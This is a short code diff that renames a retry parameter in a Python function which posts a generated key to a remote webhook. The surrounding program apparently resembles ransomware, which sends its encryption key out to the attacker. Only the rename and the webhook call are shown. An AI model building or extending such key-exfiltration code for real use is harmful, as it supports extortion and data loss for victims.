@@ -20,9 +20,9 @@ def generate_key(length: int = 64) -> bytes:
     return urlsafe_b64encode(os.urandom(length))
     
 
-def key_sender(data, trys: int = 5):
+def key_sender(data, attempts: int = 5):
     # how many tries for sending the key just in case
-    for tries in range(trys):
+    for attempt in range(attempts):
         try:
             post(webhook, data)
             print("[+] Successful sent the key to webhook")
